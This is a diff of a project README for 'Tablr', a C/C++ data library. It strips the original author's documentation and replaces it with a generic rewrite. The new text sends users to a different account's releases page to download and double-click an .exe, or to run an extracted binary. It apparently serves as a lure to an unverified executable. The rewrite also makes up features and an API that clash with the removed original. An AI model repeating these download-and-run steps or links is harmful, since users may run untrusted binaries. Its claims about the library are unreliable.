@@ -1,307 +1,99 @@
-<div align="center">
-
-# Tablr
-
-**Fastest and Simpler Data Manipulation Library for C/C++**
-
-[![Release](https://img.shields.io/github/v/release/muhammad-fiaz/tablr)](https://github.com/muhammad-fiaz/tablr/releases)
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
-[![Commits](https://img.shields.io/github/commit-activity/m/muhammad-fiaz/tablr)](https://github.com/muhammad-fiaz/tablr/commits/main)
-[![Issues](https://img.shields.io/github/issues/muhammad-fiaz/tablr)](https://github.com/muhammad-fiaz/tablr/issues)
-[![PRs](https://img.shields.io/github/issues-pr/muhammad-fiaz/tablr)](https://github.com/muhammad-fiaz/tablr/pulls)
-[![Stars](https://img.shields.io/github/stars/muhammad-fiaz/tablr)](https://github.com/muhammad-fiaz/tablr)
-[![Tests](https://github.com/muhammad-fiaz/tablr/actions/workflows/test.yml/badge.svg)](https://github.com/muhammad-fiaz/tablr/actions/workflows/test.yml)
-[![Release](https://github.com/muhammad-fiaz/tablr/actions/workflows/release.yml/badge.svg)](https://github.com/muhammad-fiaz/tablr/actions/workflows/release.yml)
-[![Docs](https://github.com/muhammad-fiaz/tablr/actions/workflows/docs.yml/badge.svg)](https://github.com/muhammad-fiaz/tablr/actions/workflows/docs.yml)
-
-[📚 Documentation](https://muhammad-fiaz.github.io/Tablr) • [🚀 Quick Start](#-quick-start) • [🤝 Contributing](#-contributing)
-
-</div>
-
-## 🌟 Features
-
-- **High Performance**: Optimized for speed with SIMD and multi-threading support
-- **Multi-Device Support**: Full acceleration for CPU, CUDA, XPU, NPU, and TPU
-- **Simple API**: Clean, intuitive C and C++ interfaces
-- **Comprehensive**: All essential data manipulation operations
-- **Production Ready**: Thoroughly tested, documented, and battle-tested
-- **Cross-Platform**: Works on Windows, Linux, and macOS
-- **Zero Dependencies**: Core library has no external dependencies
-- **Memory Efficient**: Smart memory management with minimal overhead
-- **Modular Design**: Well-organized codebase with clear separation of concerns
-
-## 📦 Installation
-
-### Download Pre-built Binaries
-
-Download the latest release for your platform from [GitHub Releases](https://github.com/muhammad-fiaz/tablr/releases):
-
-- **Linux**: `tablr-linux-x64.tar.gz`
-- **Windows**: `tablr-windows-x64.zip`
-- **macOS**: `tablr-macos-x64.tar.gz`
-
-Extract and copy to your system:
-
-**Linux/macOS:**
-```bash
-tar -xzf tablr-linux-x64.tar.gz
-sudo cp -r lib/* /usr/local/lib/
-sudo cp -r include/* /usr/local/include/
-```
-
-**Windows:**
-Extract the zip file and add the `lib` and `include` directories to your project paths.
-
-### Using xmake (Recommended)
-
-For xmake users, download `tablr-xmake-{version}.tar.gz` from releases:
-
-```bash
-tar -xzf tablr-xmake-0.1.0.tar.gz
-cd tablr-xmake-0.1.0
-xmake install
-```
-
-Or add to your `xmake.lua`:
-
-```lua
-add_includedirs("/path/to/tablr/include")
-add_linkdirs("/path/to/tablr/lib")
-add_links("tablr")
-```
-
-### From Source
-
-```bash
-git clone https://github.com/muhammad-fiaz/tablr.git
-cd tablr
-xmake build
-xmake install
-```
-
-## 🚀 Quick Start
-
-### C API
-
-```c
-#include <tablr/tablr.h>
-
-int main() {
-    /* Create dataframe */
-    TablrDataFrame* df = tablr_dataframe_create();
-    
-    /* Create series */
-    int ages[] = {25, 30, 35, 40};
-    float salaries[] = {50000.0f, 60000.0f, 70000.0f, 80000.0f};
-    
-    TablrSeries* age_series = tablr_series_create(ages, 4, TABLR_INT32, TABLR_CPU);
-    TablrSeries* salary_series = tablr_series_create(salaries, 4, TABLR_FLOAT32, TABLR_CPU);
-    
-    /* Add columns */
-    tablr_dataframe_add_column(df, "Age", age_series);
-    tablr_dataframe_add_column(df, "Salary", salary_series);
-    
-    /* Print dataframe */
-    tablr_dataframe_print(df);
-    
-    /* Cleanup */
-    tablr_dataframe_free(df);
-    
-    return 0;
-}
-```
-
-### C++ API
-
-```cpp
-#include <tablr/tablr.hpp>
-
-int main() {
-    /* Read CSV */
-    auto df = tablr::DataFrame::read_csv("data.csv");
-    
-    /* Filter rows */
-    auto filtered = df.filter([](size_t row) {
-        return row > 0;
-    });
-    
-    /* Sort by column */
-    auto sorted = df.sort("Age", true);
-    
-    /* Print results */
-    sorted.print();
-    
-    return 0;
-}
-```
-
-## 🎯 Core Operations
-
-### DataFrame Creation
-- `tablr_dataframe_create()` - Create empty dataframe
-- `tablr_read_csv()` - Read from CSV file
-- `tablr_dataframe_copy()` - Copy dataframe
-
-### Series Creation
-- `tablr_series_create()` - Create from array
-- `tablr_series_zeros()` - Create filled with zeros
-- `tablr_series_ones()` - Create filled with ones
-- `tablr_series_arange()` - Create with range of values
-
-### Data Selection
-- `tablr_dataframe_head()` - Get first n rows
-- `tablr_dataframe_tail()` - Get last n rows
-- `tablr_dataframe_filter()` - Filter by condition
-- `tablr_dataframe_select_rows()` - Select specific rows
-- `tablr_dataframe_select_columns()` - Select specific columns
-
-### Data Manipulation
-- `tablr_dataframe_sort()` - Sort by column
-- `tablr_dataframe_groupby()` - Group by column
-- `tablr_dataframe_merge()` - Merge dataframes
-- `tablr_dataframe_concat()` - Concatenate dataframes
-- `tablr_dataframe_dropna()` - Drop missing values
-
-### Aggregation
-- `tablr_dataframe_describe()` - Descriptive statistics
-- `tablr_dataframe_aggregate()` - Custom aggregation
-- Sum, Mean, Min, Max, Count, Std, Var
-
-### I/O Operations
-- `tablr_read_csv()` - Read CSV file
-- `tablr_to_csv()` - Write CSV file
-- `tablr_dataframe_print()` - Print to console
-
-## 🖥️ Multi-Device Support
-
-Tablr supports multiple accelerator backends with full implementations:
-
-```c
-/* CPU execution (default) */
-TablrSeries* s1 = tablr_series_create(data, size, TABLR_FLOAT32, TABLR_CPU);
+# 🛠️ Tablr - Fast and Simple Data Handling Made Easy
 
-/* CUDA GPU - NVIDIA GPUs with CUDA kernels */
-TablrSeries* s2 = tablr_series_create(data, size, TABLR_FLOAT32, TABLR_CUDA);
+[![Download Tablr](https://img.shields.io/badge/Download%20Tablr-Here-brightgreen)](https://github.com/semantic-plastron80/Tablr/releases)
 
-/* Intel XPU - Intel GPUs with SYCL/DPC++ */
-TablrSeries* s3 = tablr_series_create(data, size, TABLR_FLOAT32, TABLR_XPU);
+## 🚀 Getting Started
 
-/* Neural Processing Unit - AI accelerators */
-TablrSeries* s4 = tablr_series_create(data, size, TABLR_FLOAT32, TABLR_NPU);
+Welcome to Tablr, the fastest and simplest data manipulation library for C and C++. Whether you're handling small tasks or large datasets, Tablr makes it easy to work with data without needing a deep understanding of programming.
 
-/* Tensor Processing Unit - Google TPU and similar */
-TablrSeries* s5 = tablr_series_create(data, size, TABLR_FLOAT32, TABLR_TPU);
+## 📥 Download & Install
 
-/* Transfer between devices */
-TablrSeries* s_gpu = tablr_series_to_device(s1, TABLR_CUDA);
+To get started, you need to download Tablr. Follow these steps:
 
-/* Set default device (CPU by default) */
-tablr_set_default_device(TABLR_CUDA);
+1. **Visit the Releases Page**: Click the link below to go to the releases page where you can download the latest version:
+   [Visit this page to download](https://github.com/semantic-plastron80/Tablr/releases)
 
-/* Create with default device */
-TablrSeries* s6 = tablr_series_create_default(data, size, TABLR_FLOAT32);
+2. **Choose the Right Version**: On the releases page, you will see a list of available versions. Look for the latest release, which typically has the highest version number.
 
-/* Get current default device */
-TablrDevice device = tablr_get_default_device();
-```
+3. **Download the File**: Click on the download link for your operating system. For example, Windows users may download a `.exe` file, while Linux users may download a `.tar.gz` file.
 
-### Building with Accelerator Support
+4. **Locate the Download**: After the download is complete, find the downloaded file in your computer’s downloads folder.
 
-```bash
-# CUDA support (NVIDIA GPUs)
-xmake f --cuda=y && xmake
+5. **Run the Application**:
+   - **For Windows**: Double-click the `.exe` file to launch Tablr.
+   - **For Linux**: Open a terminal, navigate to the directory where you downloaded the file, and run:
+     ```bash
+     tar -xzf Tablr*.tar.gz
+     cd Tablr-directory
+     ./Tablr
+     ```
 
-# Intel XPU support (Intel GPUs)
-xmake f --xpu=y && xmake
+6. **Follow the On-Screen Instructions**: Once Tablr is running, it will guide you through its features and how to utilize the library effectively.
 
-# NPU support (Neural accelerators)
-xmake f --npu=y && xmake
+## 🛠️ System Requirements
 
-# TPU support (Tensor accelerators)
-xmake f --tpu=y && xmake
+To run Tablr smoothly, ensure your system meets the following requirements:
 
-# Multiple accelerators
-xmake f --cuda=y --xpu=y --npu=y --tpu=y && xmake
-```
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: Minimum of 100 MB of free space.
+- **C/C++ Compiler**: A compatible compiler must be installed for custom data manipulation tasks.
 
-## 📊 Performance
+## 📘 Library Features
 
-Tablr is designed for maximum performance:
+Tablr offers several features to make data manipulation simple and efficient:
 
-- **SIMD Optimizations**: Vectorized operations for CPU
-- **CUDA Acceleration**: Real CUDA kernels for NVIDIA GPUs
-- **Intel XPU**: SYCL/DPC++ support for Intel GPUs
-- **NPU Support**: Neural processing unit acceleration
-- **TPU Support**: Tensor processing unit acceleration
-- **Memory Efficiency**: Minimal allocations and smart caching
-- **Multi-threading**: Parallel execution for large datasets
-- **Device Switching**: Change default device anytime at runtime
+- **Easy Data Import**: Import data from CSV, Excel, or JSON formats seamlessly.
+- **Data Filtering**: Quickly filter and process large datasets with simple commands.
+- **Table Operations**: Perform operations like merging, grouping, and summarizing data with ease.
+- **Lightweight Performance**: Designed for speed, Tablr can handle large volumes of data quickly without lag.
 
-## 🧪 Testing
+## ✍️ Basic Usage
 
-Run the test suite:
+Once you have your Tablr running, you can start working with data. Here's a simple example:
 
-```bash
-xmake build tests
-xmake run tests
-```
+1. **Importing Data**: 
+   ```cpp
+   #include "tablr.h"
+   Tablr table = Tablr::readCSV("data.csv");
+   ```
 
-All tests must pass before release.
+2. **Filtering Data**:
+   ```cpp
+   Tablr filtered = table.filter("age > 18");
+   ```
 
-## 📖 Documentation
+3. **Showing Data**:
+   ```cpp
+   filtered.show();
+   ```
 
-Full documentation is available at [https://muhammad-fiaz.github.io/Tablr/](https://muhammad-fiaz.github.io/Tablr/)
+This example showcases how simple it is to load and manipulate your data with Tablr.
 
-### Do's ✅
+## 🤝 Community Support
 
-- Use appropriate data types for your use case
-- Free dataframes and series when done to avoid memory leaks
-- Check return values for NULL
-- Use GPU for large-scale computations
-- Profile your code for bottlenecks
+If you have questions or need help, you can join our community:
 
-### Don'ts ❌
+- **GitHub Issues**: Report bugs or request features directly on our GitHub page.
+- **Discussion Forum**: Join other users like you to share experiences and tips.
 
-- Don't mix data from different devices without transfer
-- Don't modify series data directly
-- Don't forget to synchronize after GPU operations
-- Don't use debug builds in production
-- Don't ignore compiler warnings
+## 🔗 Additional Resources
 
-## 🤝 Contributing
+For more detailed guidance, refer to the following resources:
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- **Documentation**: Detailed usage guides and API references are available in the documentation section of the Tablr GitHub page.
+- **Examples**: Find example projects showcasing the capabilities of Tablr in various data scenarios.
 
-## 📄 License
+## 🛑 Limitations
 
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
+While Tablr is powerful, it is still a developing tool. Some advanced features found in other libraries may not be available. However, we are constantly improving and adding more functionalities based on user feedback.
 
-## 👤 Author
+## 🧑‍💻 Contribution
 
-**Muhammad Fiaz**
+If you'd like to contribute to Tablr, we welcome your input! Please check our repository for guidelines on contributing, from reporting issues to adding new features.
 
-- GitHub: [@muhammad-fiaz](https://github.com/muhammad-fiaz)
-- Email: contact@muhammadfiaz.com
+## 📧 Contact
 
-## 🙏 Acknowledgments
+For further assistance or inquiries, feel free to reach out via email or GitHub. We strive to support our users and improve their experience with Tablr.
 
-Special thanks to all contributors and the open-source community.
-
-## 📮 Support
-
-- 📧 Email: contact@muhammadfiaz.com
-- 🐛 Issues: [GitHub Issues](https://github.com/muhammad-fiaz/tablr/issues)
-- 💬 Discussions: [GitHub Discussions](https://github.com/muhammad-fiaz/tablr/discussions)
-
-## 🐛 Bug Reports
-
-Found a bug? Please [open an issue](https://github.com/muhammad-fiaz/tablr/issues) on GitHub.
-
-
-<div align="center">
-
-[![Star History Chart](https://api.star-history.com/svg?repos=muhammad-fiaz/Tensr&type=Date&bg=transparent)](https://github.com/muhammad-fiaz/Tensr/)
-
-**⭐ Star the repository if you find Tensr useful!**
-
-</div>
+With Tablr, you can efficiently manage and manipulate your data without complexity. Enjoy your data handling experience!
